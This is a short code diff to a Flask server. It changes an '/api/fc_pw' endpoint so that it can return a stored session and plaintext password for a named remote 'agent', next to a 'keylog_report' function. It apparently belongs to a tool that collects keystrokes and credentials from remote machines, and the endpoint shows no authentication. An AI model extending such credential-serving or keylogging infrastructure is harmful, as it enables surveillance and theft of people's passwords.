@@ -405,10 +405,16 @@ def keylog_report(agent_name):
 
 @app.route("/api/fc_pw")
 def api_fc_pw():
-    """Return fastcap session+password for the first registered agent (test helper)."""
+    """Return fastcap session+password. Pass ?agent=NAME to get a specific agent."""
+    want = freq.args.get("agent", "").strip()
     for name, info in list(_fastcap_cache.items()):
-        if info.get("password"):
-            return jsonify({"session": info.get("session"), "password": info.get("password"), "agent": name})
+        if not info.get("password"):
+            continue
+        if want and name.lower() != want.lower():
+            continue
+        return jsonify({"session": info.get("session"), "password": info.get("password"), "agent": name})
+    if want:
+        return jsonify({"error": f"agent '{want}' not found or not registered"}), 404
     return jsonify({"error": "no fastcap agent registered"}), 404
 
 
